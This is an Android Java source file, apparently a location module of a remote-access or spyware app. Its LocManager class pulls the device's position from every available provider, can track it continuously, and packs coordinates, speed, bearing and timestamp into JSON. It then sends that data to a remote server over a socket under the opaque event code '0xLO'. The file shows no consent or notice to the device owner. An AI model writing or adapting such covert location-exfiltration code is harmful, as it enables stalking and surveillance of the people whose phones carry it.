package com.fason.app.features.location;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Looper;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationAvailability;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class LocManager {

    private final Context ctx;
    private final FusedLocationProviderClient fusedClient;
    private final LocationManager locationManager;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final AtomicBoolean isTracking = new AtomicBoolean(false);

    private Location lastLocation;
    private LocationCallback locationCallback;
    private long lastEmitTime = 0;
    private static final long MIN_EMIT_INTERVAL = 2000; // 2 seconds minimum between emissions

    public LocManager(Context context) {
        this.ctx = context.getApplicationContext();
        this.fusedClient = LocationServices.getFusedLocationProviderClient(ctx);
        this.locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        init();
    }

    private void init() {
        // Get last known location immediately
        fetchLastKnownLocation();

        // Set up location callback for continuous updates
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult locationResult) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    lastLocation = location;
                }
            }

            @Override
            public void onLocationAvailability(@NonNull LocationAvailability locationAvailability) {
                // Location availability changed
            }
        };
    }

    private void fetchLastKnownLocation() {
        if (!hasPermission()) return;

        try {
            // Try FusedLocationProvider first (more accurate and battery efficient)
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {

                fusedClient.getLastLocation()
                    .addOnSuccessListener(location -> {
                        if (location != null) {
                            lastLocation = location;
                        } else {
                            // Fallback to LocationManager
                            fallbackToLocationManager();
                        }
                    })
                    .addOnFailureListener(e -> fallbackToLocationManager());
            } else {
                fallbackToLocationManager();
            }
        } catch (SecurityException e) {
            fallbackToLocationManager();
        }
    }

    private void fallbackToLocationManager() {
        if (locationManager == null) return;

        try {
            // Try network provider (faster, less battery)
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (netLoc != null) {
                    lastLocation = netLoc;
                    return;
                }
            }

            // Try GPS provider (more accurate)
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (gpsLoc != null) {
                    lastLocation = gpsLoc;
                    return;
                }
            }

            // Try passive provider as last resort
            if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
                Location passiveLoc = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                if (passiveLoc != null) {
                    lastLocation = passiveLoc;
                }
            }
        } catch (SecurityException ignored) {}
    }

    private boolean hasPermission() {
        return PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION)
            || PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION);
    }

    public boolean canGetLocation() {
        if (locationManager == null) return false;

        boolean gps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        boolean net = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

        return gps || net;
    }

    /**
     * Request a single location update with high accuracy
     */
    public void requestSingleLocation() {
        if (!hasPermission()) return;

        // Update foreground service type for location
        MainService service = MainService.getInstance();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        try {
            LocationRequest request = new LocationRequest.Builder(
                    Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(2000)
                .setWaitForAccurateLocation(true)
                .setMaxUpdates(1)
                .build();

            fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
        } catch (SecurityException e) {
            // Try with coarse location
            try {
                LocationRequest request = new LocationRequest.Builder(
                        Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                    .setMinUpdateIntervalMillis(5000)
                    .setMaxUpdates(1)
                    .build();

                fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
            } catch (SecurityException ignored) {}
        }
    }

    /**
     * Start continuous location tracking
     */
    public void startLocationUpdates() {
        if (isTracking.getAndSet(true)) return; // Already tracking
        if (!hasPermission()) return;

        // Update foreground service type for location
        MainService service = MainService.getInstance();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        try {
            LocationRequest request = new LocationRequest.Builder(
                    Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                .setMinUpdateIntervalMillis(5000)
                .setMinUpdateDistanceMeters(10) // Only update if moved 10 meters
                .build();

            fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
        } catch (SecurityException e) {
            // Try with lower accuracy
            try {
                LocationRequest request = new LocationRequest.Builder(
                        Priority.PRIORITY_LOW_POWER, 30000)
                    .setMinUpdateIntervalMillis(15000)
                    .build();

                fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
            } catch (SecurityException ignored) {}
        }
    }

    /**
     * Stop location updates
     */
    public void stopLocationUpdates() {
        if (!isTracking.getAndSet(false)) return; // Not tracking

        try {
            fusedClient.removeLocationUpdates(locationCallback);
        } catch (Exception ignored) {}

        // Release foreground service type for location
        MainService service = MainService.getInstance();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.releaseForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }
    }

    /**
     * Get current location data as JSON
     */
    public JSONObject getData() {
        JSONObject data = new JSONObject();
        try {
            if (lastLocation != null) {
                data.put("enabled", true);
                data.put("latitude", lastLocation.getLatitude());
                data.put("longitude", lastLocation.getLongitude());
                data.put("altitude", lastLocation.getAltitude());
                data.put("accuracy", lastLocation.getAccuracy());
                data.put("speed", lastLocation.getSpeed());
                data.put("provider", lastLocation.getProvider());
                data.put("timestamp", lastLocation.getTime());
                data.put("bearing", lastLocation.getBearing());
            } else {
                data.put("enabled", false);
                data.put("error", "No location available");
            }
        } catch (Exception e) {
            try {
                data.put("enabled", false);
                data.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return data;
    }

    /**
     * Get location and emit to server
     */
    public void getLocationAndEmit() {
        executor.execute(() -> {
            try {
                // First, try to get fresh location
                requestSingleLocation();

                // Wait a bit for location
                Thread.sleep(3000);

                // Emit the result
                JSONObject data = getData();
                long now = System.currentTimeMillis();
                if (now - lastEmitTime > MIN_EMIT_INTERVAL) {
                    SocketClient.getInstance().getSocket().emit("0xLO", data);
                    lastEmitTime = now;
                }
            } catch (Exception ignored) {}
        });
    }

    /**
     * Force refresh location from all sources
     */
    public void forceRefresh() {
        fetchLastKnownLocation();
        requestSingleLocation();
    }
}
